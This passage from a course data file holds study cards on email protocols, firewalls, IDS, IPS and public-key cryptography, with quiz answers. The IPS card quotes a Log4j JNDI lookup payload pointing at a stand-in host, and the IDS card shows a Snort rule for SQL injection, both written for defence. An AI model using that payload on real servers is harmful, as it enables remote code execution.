      compareWith: ["pop3"],
      primaryUses: ["Server-to-Server Email Relay, Client Mail Submission"]
    },
    sections: {
      overview: `<strong>SMTP (Simple Mail Transfer Protocol)</strong> is the principal application-layer protocol for Internet email. It operates over TCP, historically on port 25 for server-to-server relay, and on port 587 (Submission) with authentication for user agents.`,
      howItWorks: `
        <ol class="wiki-ordered-list">
          <li><strong>Connection Handshake:</strong> Client opens TCP connection; server replies with greeting \`220 server.com ready\`.</li>
          <li><strong>Identification:</strong> Client sends \`HELO\` or \`EHLO\` (Extended SMTP).</li>
          <li><strong>Sender Specification:</strong> Client sends \`MAIL FROM: <alice@example.com>\`.</li>
          <li><strong>Recipient Specification:</strong> Client sends one or more \`RCPT TO: <bob@harvard.edu>\`.</li>
          <li><strong>Data Transfer:</strong> Client sends \`DATA\`. Server responds \`354 Start mail input\`. Client sends message headers and body, terminating with a line containing only a single period: \`\\r\\n.\\r\\n\`.</li>
          <li><strong>Closure:</strong> Client sends \`QUIT\`.</li>
        </ol>`,
      diagram: `
Client                                             Server
  | <----------------- 220 mail.example.com -------- |
  | --- HELO client.com ---------------------------> |
  | <----------------- 250 Hello client.com -------- |
  | --- MAIL FROM: <alice@client.com> -------------> |
  | <----------------- 250 2.1.0 Ok ---------------- |
  | --- RCPT TO: <bob@example.com> ----------------> |
  | <----------------- 250 2.1.5 Ok ---------------- |
  | --- DATA --------------------------------------> |
  | <----------------- 354 End data with <CR><LF>.<CR><LF>
  | --- Subject: Networks Project                    |
  |     Hello Bob, how is Unit V?                    |
  |     . -----------------------------------------> |
  | <----------------- 250 2.0.0 Ok: queued -------- |
  | --- QUIT --------------------------------------> |`,
      technicalDetails: `Comparison with HTTP:
        <ul class="wiki-bullet-list">
          <li><strong>HTTP:</strong> Primarily a *pull* protocol; each object is encapsulated in its own HTTP response message.</li>
          <li><strong>SMTP:</strong> Primarily a *push* protocol; multiple mail messages can be transferred across a single persistent TCP connection.</li>
          <li><strong>Character Set:</strong> SMTP was originally restricted to 7-bit ASCII; modern multimedia attachments require MIME encoding (RFC 2045).</li>
        </ul>`,
      workedExample: `To test SMTP manually from command prompt:
        <pre class="wiki-code-block">telnet mail.example.com 25
220 mail.example.com ESMTP Postfix
EHLO mylaptop.local
250-mail.example.com
250 STARTTLS
MAIL FROM:<me@test.com>
250 Ok
RCPT TO:<friend@example.com>
250 Ok</pre>`,
      advantagesLimitations: `
        <table class="wiki-table">
          <thead><tr><th>Advantages</th><th>Limitations</th></tr></thead>
          <tbody>
            <tr><td>Simple, robust text-based protocol</td><td>No built-in authentication in RFC 821 (enabled spam)</td></tr>
            <tr><td>Persistent connection efficiency</td><td>Modern SMTP requires SPF, DKIM, and DMARC DNS records to prevent spoofing</td></tr>
          </tbody>
        </table>`,
      whereUsed: ["Every email sent on the Internet", "Postfix, Sendmail, and Microsoft Exchange mail servers"],
      commonMistakes: "Using port 25 for sending email from home. Most residential ISPs block outbound port 25 to prevent malware botnets from spamming. Modern email clients use port 587 with STARTTLS.",
      compareWith: { title: "SMTP vs HTTP", note: "SMTP pushes text and MIME attachments from sender to receiver. HTTP pulls resources from server to client." },
      practice: {
        question: "How does an SMTP client indicate the end of the email message body?",
        choices: ["By closing the TCP connection", "By sending a line containing only a single period: [CRLF].[CRLF]", "By sending the QUIT command", "By sending an ACK segment"],
        correctIndex: 1,
        explanation: "In SMTP, the end of the mail data payload is marked by a line containing strictly a single period (ASCII 0x2E) flanked by carriage-return line-feeds."
      },
      references: [
        { cite: "RFC 5321: Simple Mail Transfer Protocol", url: "https://datatracker.ietf.org/doc/html/rfc5321" }
      ]
    },
    prevTopicId: "email-system",
    nextTopicId: "pop3"
  },

  "pop3": {
    id: "pop3",
    title: "Post Office Protocol version 3 (POP3)",
    unit: "Unit V: Application Layer & Network Security",
    unitId: "unit5",
    level: "Level 1 — Concept Card",
    category: "application",
    difficulty: "Foundation",
    readingTime: "4 min read",
    standard: "RFC 1939",
    oneLiner: "A download-and-delete mail access protocol that transfers messages from the server to one local client.",
    quickAnswer: "POP3 connects to port 110, downloads all new messages to the local hard drive, and deletes them from the server.",
    whyItMatters: "POP3 was designed in the 1980s when users had a single desktop computer with limited server storage, though it has largely been replaced by IMAP.",
    infobox: {
      layer: "Layer 7 (TCP Port 110 / 995 POP3S)",
      standard: "RFC 1939",
      type: "Mail Retrieval Protocol",
      keyFormula: "\\text{Model: } \\text{Download and Delete from Server}",
      prerequisites: ["email-system"],
      relatedConcepts: ["imap", "smtp"],
      compareWith: ["imap"],
      primaryUses: ["Offline Mail Storage, Archival Email Clients"]
    },
    sections: {
      overview: `Specified in RFC 1939, <strong>POP3 (Post Office Protocol version 3)</strong> is an extremely simple mail retrieval protocol. Its default operation is "download-and-delete": the user agent connects, downloads messages to local storage, deletes them from the server, and terminates the connection.`,
      howItWorks: `
        <ol class="wiki-ordered-list">
          <li><strong>Authorization Phase:</strong> Client sends \`USER <name>\` and \`PASS <password>\`. Server verifies credentials.</li>
          <li><strong>Transaction Phase:</strong> Client queries mail count (\`STAT\`), lists messages (\`LIST\`), retrieves messages (\`RETR <msg>\`), and marks for deletion (\`DELE <msg>\`).</li>
          <li><strong>Update Phase:</strong> Client issues \`QUIT\`. Server deletes marked messages and closes TCP connection.</li>
        </ol>`,
      diagram: `
User Laptop                                         Mail Server
     |                                                    |
     | ----- USER alex ---------------------------------> |
     | <---- +OK User accepted -------------------------- |
     | ----- PASS secret123 ----------------------------> |
     | <---- +OK Logged in ------------------------------ |
     | ----- RETR 1 ------------------------------------> |
     | <---- +OK 1200 octets [Message Body] ------------- |
     | ----- DELE 1 ------------------------------------> |
     | ----- QUIT --------------------------------------> |
     |       (Message is deleted from server!)            |`,
      technicalDetails: `POP3 Operation Modes:
        <ul class="wiki-bullet-list">
          <li><strong>Download-and-Delete:</strong> Messages are permanently removed from server. If user checks email on phone later, the inbox is empty!</li>
          <li><strong>Download-and-Keep:</strong> Client leaves copies on server, but folder changes, read/unread flags, and sent messages are never synchronized between devices.</li>
        </ul>`,
      workedExample: `A user checks email on work PC via POP3 download-and-delete. Later at home, they check email on their laptop. The inbox is completely empty because the work PC deleted the messages from the server!`,
      advantagesLimitations: `
        <table class="wiki-table">
          <thead><tr><th>Advantages</th><th>Limitations</th></tr></thead>
          <tbody>
            <tr><td>Zero server disk storage consumption</td><td>Cannot synchronize folders or read states across devices</td></tr>
            <tr><td>Full offline access to downloaded mail</td><td>Downloaded mail lost if computer hard drive crashes</td></tr>
          </tbody>
        </table>`,
      whereUsed: ["Legacy email clients", "Local email archival backup software"],
      commonMistakes: "Using POP3 on multiple mobile devices. POP3 is not designed for multi-device synchronization; modern users should always use IMAP.",
      compareWith: { title: "POP3 vs IMAP", note: "POP3 downloads and deletes messages locally. IMAP keeps all messages permanently on the server, synchronizing folders across all laptops and smartphones." },
      practice: {
        question: "What is the primary drawback of POP3's default download-and-delete mode in a modern mobile environment?",
        choices: ["It uses too much server memory", "Messages downloaded to one device cannot be viewed on other devices", "It requires fiber cables", "It cannot receive attachments"],
        correctIndex: 1,
        explanation: "Because POP3 downloads messages to local storage and deletes them from the server, other devices (phones, laptops) cannot access those messages."
      },
      references: [
        { cite: "RFC 1939: Post Office Protocol - Version 3", url: "https://datatracker.ietf.org/doc/html/rfc1939" }
      ]
    },
    prevTopicId: "smtp",
    nextTopicId: "imap"
  },

  "imap": {
    id: "imap",
    title: "Internet Message Access Protocol (IMAP)",
    unit: "Unit V: Application Layer & Network Security",
    unitId: "unit5",
    level: "Level 1 — Concept Card",
    category: "application",
    difficulty: "Core",
    readingTime: "5 min read",
    standard: "RFC 3501",
    oneLiner: "A modern mail synchronization protocol keeping messages permanently organized on the server across multiple devices.",
    quickAnswer: "IMAP stores all emails permanently on the server, allowing multiple devices (phone, laptop, webmail) to synchronize folders, read flags, and message status in real time.",
    whyItMatters: "IMAP enables the modern multi-device email experience where an email read or moved to a folder on your phone is instantly reflected on your computer.",
    infobox: {
      layer: "Layer 7 (TCP Port 143 / 993 IMAPS)",
      standard: "RFC 3501",
      type: "Server-Side Mail Synchronization",
      keyFormula: "\\text{Architecture: } \\text{Permanent Server Storage + Folder Hierarchy}",
      prerequisites: ["email-system"],
      relatedConcepts: ["pop3", "smtp", "email-system"],
      compareWith: ["pop3"],
      primaryUses: ["Apple Mail, Outlook, Thunderbird, Modern Smartphone Mail"]
    },
    sections: {
      overview: `Defined in RFC 3501, <strong>IMAP (Internet Message Access Protocol)</strong> is an advanced mail access protocol. Unlike POP3, IMAP treats the mail server as the authoritative primary storage repository, associating each message with a folder hierarchy and synchronization flags.`,
      howItWorks: `
        <ol class="wiki-ordered-list">
          <li><strong>Server-Side Mailboxes:</strong> All messages remain permanently stored on the mail server in folders (\`INBOX\`, \`Sent\`, \`Work\`, \`Archive\`).</li>
          <li><strong>State Synchronization:</strong> Flags such as \`\\Seen\`, \`\\Answered\`, and \`\\Deleted\` are stored on the server. If you read an email on your phone, your laptop instantly marks it as read.</li>
          <li><strong>Partial Fetch:</strong> IMAP allows user agents to download just the message headers or specific MIME attachments without downloading the entire 50 MB video attachment over slow cellular links.</li>
          <li><strong>Server Search:</strong> Users can search millions of emails directly on the powerful server hardware.</li>
        </ol>`,
      diagram: `
+-------------------------------------------------------------+
|                      IMAP MAIL SERVER                       |
|  [ User Mailbox: INBOX, Sent, Archive, Drafts ]             |
|  [ Message State: \\Seen, \\Flagged, \\Answered ]            |
+-------------------------------------------------------------+
         ^                                           ^
         | IMAP (Port 993)                           | IMAP (Port 993)
         v                                           v
+------------------+                        +------------------+
| SMARTPHONE APP   |                        | LAPTOP BROWSER   |
| Read email here  | === Synced in Real ===>| Marked read here |
+------------------+     Time Across Both!  +------------------+`,
      technicalDetails: `Comparison of POP3 vs IMAP (Kurose & Ross Ch 2.3):
        <ul class="wiki-bullet-list">
          <li><strong>Storage:</strong> POP3 stores mail locally; IMAP stores mail on the server.</li>
          <li><strong>State:</strong> POP3 is stateless across sessions; IMAP maintains persistent folder state and message flags.</li>
          <li><strong>Bandwidth:</strong> POP3 downloads whole messages; IMAP downloads headers first, fetching attachments on demand.</li>
        </ul>`,
      workedExample: `You open an email on your iPhone while commuting. IMAP updates the server flag to \`\\Seen\`. When you open Apple Mail on your MacBook at work, the message is already marked as read, and changes you make to folders sync instantly.`,
      advantagesLimitations: `
        <table class="wiki-table">
          <thead><tr><th>Advantages</th><th>Limitations</th></tr></thead>
          <tbody>
            <tr><td>Flawless multi-device synchronization</td><td>High server disk space requirements (gigabytes per user)</td></tr>
            <tr><td>Folder organization preserved on server</td><td>Complex protocol implementation in client software</td></tr>
            <tr><td>Selective download of large attachments</td><td>Requires periodic server backups to avoid data loss</td></tr>
          </tbody>
        </table>`,
      whereUsed: ["Modern smartphones (iOS Mail, Android Gmail app)", "Desktop clients (Microsoft Outlook, Apple Mail)", "Enterprise corporate mailboxes"],
      commonMistakes: "Thinking Gmail webmail uses IMAP. Gmail web interface uses HTTPS/HTTP; IMAP is used when desktop mail apps like Apple Mail connect to Gmail.",
      compareWith: { title: "IMAP vs POP3", note: "IMAP keeps messages on the server with full multi-device folder sync. POP3 downloads messages locally to a single machine." },
      practice: {
        question: "Which email retrieval protocol allows a user to download only message headers while leaving large attachments on the server until explicitly requested?",
        choices: ["SMTP", "POP3", "IMAP", "FTP"],
        correctIndex: 2,
        explanation: "IMAP provides partial fetch capabilities, allowing user agents to obtain message headers and fetch MIME parts or attachments on demand."
      },
      references: [
        { cite: "RFC 3501: Internet Message Access Protocol - Version 4rev1", url: "https://datatracker.ietf.org/doc/html/rfc3501" }
      ]
    },
    prevTopicId: "pop3",
    nextTopicId: "firewall"
  },

  "firewall": {
    id: "firewall",
    title: "Network Firewalls (NIST SP 800-41)",
    unit: "Unit V: Application Layer & Network Security",
    unitId: "unit5",
    level: "Level 2 — Standard Topic",
    category: "security",
    difficulty: "Core",
    readingTime: "6 min read",
    standard: "NIST SP 800-41 Rev. 1",
    oneLiner: "Perimeter security systems enforcing access control policies by permitting or denying network traffic.",
    quickAnswer: "A firewall inspects packets at network boundaries, applying security policies to allow, block, or drop traffic based on IP addresses, port numbers, connection state, or application payload.",
    whyItMatters: "Firewalls are the first line of defense in cybersecurity, isolating secure internal corporate networks from the untrusted public Internet.",
    infobox: {
      layer: "Layer 3, Layer 4 & Layer 7",
      standard: "NIST SP 800-41 Rev. 1",
      type: "Traffic Access Control Appliance",
      keyFormula: "\\text{Policy Rule: } [\\text{Src/Dst IP}, \\text{Port}, \\text{Protocol}, \\text{State}] \\to \\{\\text{ALLOW}, \\text{DENY}\\}",
      prerequisites: ["packet", "tcp", "port"],
      relatedConcepts: ["ids", "ips", "rsa"],
      compareWith: ["ids"],
      primaryUses: ["Enterprise Perimeters, Cloud Security Groups, Linux iptables/nftables"]
    },
    sections: {
      overview: `A <strong>firewall</strong> is a network security device that monitors and controls incoming and outgoing network traffic based on predetermined security rules. Standardized in NIST SP 800-41 Rev. 1, firewalls establish a protective barrier between trusted internal networks and untrusted external networks.`,
      howItWorks: `
        <ol class="wiki-ordered-list">
          <li><strong>Stateless Packet Filtering (Traditional):</strong> Inspects each packet independently against an Access Control List (ACL) matching Source/Dest IP, Protocol (TCP/UDP), and Source/Dest Port.</li>
          <li><strong>Stateful Inspection (Modern Standard):</strong> Tracks active TCP connection state (SYN, ESTABLISHED) in a state table. Only packets belonging to legitimate, internally-initiated connections are permitted inbound.</li>
          <li><strong>Application-Level Proxy / Next-Gen Firewall (NGFW):</strong> Reassembles application payloads, inspecting HTTP/HTTPS URLs, inspecting TLS certificates, and blocking application-level attacks.</li>
          <li><strong>Default Deny Rule:</strong> Best security practice blocks all traffic by default, explicitly permitting only necessary services.</li>
        </ol>`,
      diagram: `
UNTRUSTED INTERNET                              TRUSTED INTERNAL LAN
        |                                                 |
[External Attacker]                                [Corporate PCs]
        |                                                 ^
        v                                                 |
+---------------------------------------------------------+----+
|                     STATEFUL FIREWALL                        |
|  State Table:                                                |
|  - Inbound port 80 to Web Server (10.0.0.5) ----> ALLOW     |
|  - Inbound port 22 (SSH) from Internet ---------> DROP!     |
|  - Outbound web traffic (10.0.0.X) -------------> ALLOW     |
|  - Return traffic for established TCP ----------> ALLOW     |
+--------------------------------------------------------------+`,
      technicalDetails: `NIST SP 800-41 Rev. 1 Architecture:
        <ul class="wiki-bullet-list">
          <li><strong>Demilitarized Zone (DMZ):</strong> A semi-trusted perimeter subnet housing public-facing servers (Web, Mail, DNS). If a web server in the DMZ is compromised, the firewall prevents the attacker from pivoting into the internal corporate network.</li>
          <li><strong>Action: DROP vs REJECT:</strong> \`DROP\` silently discards packets (attacker times out, leaking no information). \`REJECT\` returns a TCP RST or ICMP Port Unreachable message.</li>
        </ul>`,
      workedExample: `Sample Linux \`iptables\` stateful rule:
        <pre class="wiki-code-block"># Allow outgoing traffic and established return traffic
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
# Allow inbound web traffic to local server
iptables -A INPUT -p tcp --dport 80 -j ACCEPT
# Drop all other inbound traffic by default
iptables -P INPUT DROP</pre>`,
      advantagesLimitations: `
        <table class="wiki-table">
          <thead><tr><th>Firewall Class</th><th>Inspection Layer</th><th>Protection Level</th></tr></thead>
          <tbody>
            <tr><td>Packet Filter</td><td>Layers 3 & 4 (IP/Port)</td><td>Basic; vulnerable to IP spoofing</td></tr>
            <tr><td>Stateful Inspection</td><td>Layers 3 & 4 + TCP State</td><td>High; blocks unsolicited inbound probes</td></tr>
            <tr><td>Application Proxy</td><td>Layer 7 (Payload/HTTP)</td><td>Deep; inspects malware inside payloads</td></tr>
          </tbody>
        </table>`,
      whereUsed: ["Enterprise perimeter gateways (Palo Alto, Fortinet, Cisco)", "Cloud VPC security groups (AWS Security Groups)", "Host-based firewalls (Windows Defender Firewall, Linux ufw)"],
      commonMistakes: "Believing a firewall prevents all malware. Firewalls enforce access control policies (who can talk to what port); they cannot prevent a user from voluntarily downloading malware over allowed port 443 unless advanced deep-packet inspection (NGFW) is active.",
      compareWith: { title: "Firewall vs IDS vs IPS", note: "Firewalls enforce access control policies. IDS passively detects and alerts on attacks. IPS actively blocks in-progress exploits inline." },
      practice: {
        question: "Why is a stateful firewall superior to a simple stateless packet filter?",
        choices: ["It encrypts all traffic", "It tracks TCP connection state, automatically permitting return traffic for established connections while blocking unsolicited inbound probes", "It increases bandwidth", "It eliminates router latency"],
        correctIndex: 1,
        explanation: "Stateful inspection tracks bidirectional connection state, permitting incoming traffic only if it corresponds to an established connection previously initiated from inside."
      },
      references: [
        { cite: "NIST SP 800-41 Rev. 1: Guidelines on Firewalls and Firewall Policy", url: "https://csrc.nist.gov/publications/detail/sp/800-41/rev-1/final" }
      ]
    },
    prevTopicId: "imap",
    nextTopicId: "ids"
  },

  "ids": {
    id: "ids",
    title: "Intrusion Detection System (IDS)",
    unit: "Unit V: Application Layer & Network Security",
    unitId: "unit5",
    level: "Level 1 — Concept Card",
    category: "security",
    difficulty: "Core",
    readingTime: "5 min read",
    standard: "NIST SP 800-94",
    oneLiner: "A passive monitoring system inspecting traffic copies to detect and alert on suspicious activity.",
    quickAnswer: "An IDS is like a security camera: it sits out-of-band, inspects mirrored copies of network packets, and generates alerts when malicious patterns or anomalies are detected.",
    whyItMatters: "Standard firewalls only check IP addresses and ports; an IDS inspects packet payloads to detect malware, SQL injection, port scans, and zero-day vulnerabilities.",
    infobox: {
      layer: "All Layers (L3 through L7)",
      standard: "NIST SP 800-94 (IDPS Guide)",
      type: "Passive Security Monitoring",
      keyFormula: "\\text{Deployment: } \\text{Out-of-band via TAP / SPAN Port}",
      prerequisites: ["firewall"],
      relatedConcepts: ["ips", "firewall"],
      compareWith: ["ips"],
      primaryUses: ["Security Operations Centers (SOC), Snort, Suricata, Zeek"]
    },
    sections: {
      overview: `An <strong>Intrusion Detection System (IDS)</strong> is a passive software or hardware appliance that monitors network traffic for malicious activity or policy violations, logging incidents and alerting security analysts. Standardized in NIST SP 800-94.`,
      howItWorks: `
        <ol class="wiki-ordered-list">
          <li><strong>Out-of-Band Deployment:</strong> Connected via a switch SPAN (mirror) port or optical network TAP. It receives mirrored copies of packets without standing directly in the live traffic path.</li>
          <li><strong>Detection Methodologies:</strong>
            <ul>
              <li><strong>Signature-Based:</strong> Matches byte sequences against a database of known threat signatures (like antivirus). Highly accurate for known threats; blind to zero-days.</li>
              <li><strong>Anomaly-Based:</strong> Builds a baseline of normal network behavior. Alerts when statistical deviations occur (e.g. sudden spike in ICMP traffic). Detects zero-days; higher false-positive rate.</li>
            </ul>
          </li>
          <li><strong>Alert Generation:</strong> Generates syslog or SNMP alerts sent to a SIEM (Security Information and Event Management) system.</li>
        </ol>`,
      diagram: `
+------------------+                   +------------------+
| EXTERNAL TRAFFIC |==================>| INTERNAL NETWORK |
+------------------+   Live Path       +------------------+
          |
          | Mirrored Traffic (SPAN / TAP)
          v
+------------------------------------+
|    INTRUSION DETECTION SYSTEM      |
|  - Deep Packet Inspection (DPI)    |
|  - Signature & Anomaly Matching    |
|  - Generates Alert to SOC Analyst! |
+------------------------------------+`,
      technicalDetails: `NIDS vs HIDS:
        <br>• <strong>Network-Based IDS (NIDS):</strong> Monitors traffic across an entire subnet (e.g., Snort, Suricata).
        <br>• <strong>Host-Based IDS (HIDS):</strong> Runs on an individual server inspecting OS system calls, authentication logs, and file integrity (e.g., OSSEC, Wazuh).`,
      workedExample: `Snort Rule:
        <pre class="wiki-code-block">alert tcp any any -> 192.168.1.0/24 80 (msg:"SQL Injection Attempt"; content:"UNION SELECT"; sid:1000001;)</pre>
        When an external attacker probes a web server with \`UNION SELECT\`, Snort logs an urgent alert to the security operations center.`,
      advantagesLimitations: `
        <table class="wiki-table">
          <thead><tr><th>Advantages</th><th>Limitations</th></tr></thead>
          <tbody>
            <tr><td>Zero network latency penalty (sits out-of-band)</td><td>Passive: cannot stop attacks in real time</td></tr>
            <tr><td>Failure does not interrupt live network traffic</td><td>Attacker may succeed before alert is reviewed</td></tr>
          </tbody>
        </table>`,
      whereUsed: ["Security Operations Centers (SOCs)", "Compliance auditing (PCI-DSS, HIPAA)", "Snort, Suricata, and Zeek network monitors"],
      commonMistakes: "Believing an IDS blocks malicious packets. An IDS is passive (like a burglar alarm); it detects and alerts, but does not block traffic. Blocking traffic requires an inline IPS.",
      compareWith: { title: "IDS vs IPS", note: "An IDS is passive (detects and alerts out-of-band). An IPS is active and inline (drops malicious packets before they reach targets)." },
      practice: {
        question: "Why does an Intrusion Detection System (IDS) introduce zero latency into the live network traffic path?",
        choices: ["It uses optical amplification", "It is deployed out-of-band receiving copied traffic via a TAP or SPAN port", "It runs inside the router CPU", "It only inspects UDP packets"],
        correctIndex: 1,
        explanation: "Because an IDS operates out-of-band on copied packets from a TAP or mirror port, packets on the live wire flow unhindered without delay."
      },
      references: [
        { cite: "NIST SP 800-94: Guide to Intrusion Detection and Prevention Systems (IDPS)", url: "https://csrc.nist.gov/publications/detail/sp/800-94/final" }
      ]
    },
    prevTopicId: "firewall",
    nextTopicId: "ips"
  },

  "ips": {
    id: "ips",
    title: "Intrusion Prevention System (IPS)",
    unit: "Unit V: Application Layer & Network Security",
    unitId: "unit5",
    level: "Level 1 — Concept Card",
    category: "security",
    difficulty: "Core",
    readingTime: "5 min read",
    standard: "NIST SP 800-94",
    oneLiner: "An active inline security appliance inspecting live packets and immediately blocking malicious traffic.",
    quickAnswer: "An IPS sits directly inline in the network cable, inspecting packets in real time and automatically dropping malicious packets before they reach vulnerable servers.",
    whyItMatters: "While an IDS only watches, an IPS acts immediately, preventing ransomware, buffer overflow exploits, and network worms from infecting systems.",
    infobox: {
      layer: "All Layers (L3 through L7)",
      standard: "NIST SP 800-94",
      type: "Active Inline Threat Prevention",
      keyFormula: "\\text{Deployment: } \\text{Inline in Live Data Path (Fail-Open / Fail-Closed)}",
      prerequisites: ["ids", "firewall"],
      relatedConcepts: ["ids", "firewall"],
      compareWith: ["ids"],
      primaryUses: ["Next-Generation Firewalls (NGFW), Enterprise Perimeter Protection"]
    },
    sections: {
      overview: `An <strong>Intrusion Prevention System (IPS)</strong> is an active security device deployed directly <em>inline</em> in the physical network path. All traffic passes through the IPS. When it detects an attack, it takes immediate automated action to drop the malicious packets or terminate the connection.`,
      howItWorks: `
        <ol class="wiki-ordered-list">
          <li><strong>Inline Placement:</strong> Packets enter physical port 1 and exit port 2 only after passing inspection.</li>
          <li><strong>Real-Time Deep Packet Inspection (DPI):</strong> Analyzes protocols, normalizes traffic, and scans payloads against exploit signatures.</li>
          <li><strong>Automated Defensive Actions:</strong>
            <ul>
              <li><strong>Drop Packet:</strong> Silently discards the offending packet.</li>
              <li><strong>Reset Connection:</strong> Sends TCP RST packets to both sender and receiver to instantly kill the session.</li>
              <li><strong>Dynamic Blacklisting:</strong> Reconfigures adjacent firewall rules to block the attacker's IP for 24 hours.</li>
            </ul>
          </li>
        </ol>`,
      diagram: `
+------------------+       +-------------------------+       +------------------+
| EXTERNAL ATTACK  |======>|  INLINE IPS APPLIANCE   |======>| INTERNAL SERVER  |
| Exploit Payload! |       |  (Inspects in realtime) |       | (Protected!)     |
+------------------+       +-------------------------+       +------------------+
                                        |
                          Match Exploit Signature!
                                        |
                             [ PACKET DROPPED! ]
                             [ TCP RESET SENT! ]`,
      technicalDetails: `Fail-Open vs Fail-Closed:
        <br>Because an IPS is an inline device, if its power fails or software crashes:
        <ul class="wiki-bullet-list">
          <li><strong>Fail-Open (Bypass):</strong> Hardware relays physically bridge the ports together, maintaining network connectivity during failure (favors availability).</li>
          <li><strong>Fail-Closed:</strong> Shuts down ports completely, blocking all traffic (favors maximum security).</li>
        </ul>`,
      workedExample: `A remote attacker launches an Apache Log4j exploit payload (\`\${jndi:ldap://evil.com/a}\`).
        <br>The inline IPS detects the signature in the HTTP header, drops the packet in 5 microseconds, and sends a TCP RST to terminate the socket before the server can execute the malicious payload.`,
      advantagesLimitations: `
        <table class="wiki-table">
          <thead><tr><th>Advantages</th><th>Limitations</th></tr></thead>
          <tbody>
            <tr><td>Actively blocks threats before damage occurs</td><td>Adds microsecond latency to live network traffic</td></tr>
            <tr><td>Stops worms and automated exploit scripts</td><td>False positives drop legitimate business traffic</td></tr>
          </tbody>
        </table>`,
      whereUsed: ["Next-Generation Firewalls (Palo Alto Networks, Fortinet, Check Point)", "Cloud web application firewalls (AWS WAF)"],
      commonMistakes: "Deploying an IPS with aggressive blocking policies before tuning. Untuned IPS appliances frequently block legitimate user traffic (false positives), disrupting business operations.",
      compareWith: { title: "Firewall vs IDS vs IPS", note: "Firewalls enforce access control policies (Port 80 allowed). IDS detects and alerts passively out-of-band. IPS inspects payloads inline and drops malicious packets actively." },
      practice: {
        question: "What happens if an inline IPS produces a 'false positive' on legitimate traffic?",
        choices: ["The attack succeeds", "Legitimate business traffic is mistakenly blocked or dropped", "The network cable is physically severed", "The firewall restarts"],
        correctIndex: 1,
        explanation: "A false positive in an inline IPS causes legitimate user traffic to be mistakenly flagged as malicious and dropped, disrupting authorized communications."
      },
      references: [
        { cite: "NIST SP 800-94: Guide to Intrusion Detection and Prevention Systems (IDPS)", url: "https://csrc.nist.gov/publications/detail/sp/800-94/final" }
      ]
    },
    prevTopicId: "ids",
    nextTopicId: "public-key-cryptography"
  },

  "public-key-cryptography": {
    id: "public-key-cryptography",
    title: "Public-Key Cryptography Principles",
    unit: "Unit V: Application Layer & Network Security",
    unitId: "unit5",
    level: "Level 2 — Standard Topic",
    category: "security",
    difficulty: "Core",
    readingTime: "6 min read",
    standard: "Diffie & Hellman (1976) / Kurose & Ross Ch 8",
    oneLiner: "An asymmetric cryptographic paradigm using mathematically linked public and private key pairs.",
    quickAnswer: "Public-key cryptography uses a key pair: a public key for encryption (or signature verification) known to everyone, and a private key for decryption (or signature creation) kept secret by the owner.",
    whyItMatters: "Asymmetric cryptography solved the ancient 'key distribution problem': two parties can communicate securely across the Internet without sharing a secret key beforehand.",
    infobox: {
      layer: "Security / Application Layer",
      standard: "Diffie-Hellman (1976), RSA, ECC",
      type: "Asymmetric Cryptosystem",
      keyFormula: "D_{K_B^-}(E_{K_B^+}(M)) = M \\quad \\text{and} \\quad E_{K_B^+}(D_{K_B^-}(M)) = M",
      prerequisites: ["application-layer"],
      relatedConcepts: ["rsa", "rsa-encryption", "rsa-digital-signature"],
      compareWith: ["symmetric-encryption"],
      primaryUses: ["TLS Handshakes, SSH Keys, Digital Certificates, Bitcoin Wallets"]
    },
    sections: {
      overview: `Invented by Whitfield Diffie and Martin Hellman in 1976, <strong>Public-Key Cryptography (Asymmetric Cryptography)</strong> revolutionized information security. Instead of sharing a single secret key, each entity generates a mathematically linked <strong>Public Key</strong> ($K^+$) and <strong>Private Key</strong> ($K^-$).`,
      howItWorks: `
        <ol class="wiki-ordered-list">
          <li><strong>Confidentiality (Encryption):</strong> Alice encrypts message $M$ using Bob's public key $K_B^+$. Only Bob's private key $K_B^-$ can decrypt it:
            $$C = E_{K_B^+}(M), \\quad M = D_{K_B^-}(C)$$</li>
          <li><strong>Authentication & Non-Repudiation (Digital Signatures):</strong> Bob signs a document using his secret private key $K_B^-$. Anyone can verify the signature using Bob's public key $K_B^+$:
            $$S = D_{K_B^-}(H(M)), \\quad \\text{Verify: } E_{K_B^+}(S) \\stackrel{?}{=} H(M)$$</li>
          <li><strong>Computational Hardness:</strong> Deducing the private key from the public key is computationally infeasible (e.g. prime factoring in RSA, discrete logarithms in ECC).</li>
        </ol>`,
      diagram: `
CONFIDENTIAL ENCRYPTION:
Alice                  Public Channel                  Bob
[ Message M ]                                    [ Message M ]
      |                                                ^
      v                                                |
[ Encrypt with Bob's Public Key ] ===> [ Ciphertext C ] ===> [ Decrypt with Bob's Secret Key ]

DIGITAL SIGNATURE (Authentication):
Bob                    Public Channel                  Alice
[ Document M ]                                   [ Verify Signature ]
      |                                                ^
      v                                                |
[ Sign with Bob's Private Key ] =====> [ Signature S ] ======> [ Verify with Bob's Public Key ]`,
      technicalDetails: `Asymmetric vs Symmetric Cryptography:
        <ul class="wiki-bullet-list">
          <li><strong>Asymmetric (RSA, ECC):</strong> Solves key exchange. Slow and computationally intensive. Used to exchange symmetric session keys and sign certificates.</li>
          <li><strong>Symmetric (AES, ChaCha20):</strong> 1,000x faster in hardware. Used for bulk payload encryption once the session key is established.</li>
        </ul>`,
      workedExample: `In a modern TLS 1.3 handshake:
        <br>1. The server presents its X.509 certificate containing its RSA/ECDSA public key, authenticated by a trusted CA.
        <br>2. The client and server run Diffie-Hellman to derive a shared symmetric key $K$.
        <br>3. Bulk web page transmission is encrypted using symmetric AES-256-GCM.`,
      advantagesLimitations: `
        <table class="wiki-table">
          <thead><tr><th>Advantages</th><th>Limitations</th></tr></thead>
          <tbody>
            <tr><td>Eliminates need for pre-shared secret keys</td><td>Computationally expensive (requires large modular exponentiations)</td></tr>
            <tr><td>Provides cryptographic non-repudiation via signatures</td><td>Requires Public Key Infrastructure (PKI) to prevent public key spoofing</td></tr>
          </tbody>
        </table>`,
      whereUsed: ["HTTPS web security (TLS 1.3)", "SSH passwordless key authentication", "Software code signing and driver verification"],
      commonMistakes: "Using public-key cryptography to encrypt large files. Asymmetric encryption is far too slow for gigabyte data transfers; real-world systems use hybrid cryptography (asymmetric key exchange + symmetric bulk encryption).",
      compareWith: { title: "Public-Key (Asymmetric) vs Symmetric Cryptography", note: "Symmetric uses one shared secret for both encryption and decryption (AES). Asymmetric uses linked public and private key pairs (RSA)." },
      practice: {
        question: "To send a confidential encrypted message to Bob that only Bob can read, which key must Alice use to encrypt the message?",
        choices: ["Alice's Private Key", "Alice's Public Key", "Bob's Public Key", "Bob's Private Key"],
        correctIndex: 2,
